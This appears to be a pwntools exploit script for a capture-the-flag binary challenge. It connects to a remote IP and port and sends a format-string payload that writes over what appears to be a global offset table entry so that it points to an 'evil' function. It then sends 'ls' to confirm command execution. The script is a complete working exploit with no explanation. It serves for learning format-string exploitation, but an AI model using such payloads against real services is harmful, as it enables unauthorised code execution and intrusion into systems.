from pwn import *
"""
context.log_level='error'
"""
# evil = 0x80484d6

conn=remote('40.113.122.87',5003)
payload=""
payload+=p32(0x804a018)
payload+=p32(0x804a01a)
payload+="%4$33998x"
payload+="%4$n"
payload+="%5$33582x"
payload+="%5$n"
conn.sendline(payload)
conn.sendline("ls")
conn.recvline()
print conn.recvline()
print conn.recvline()

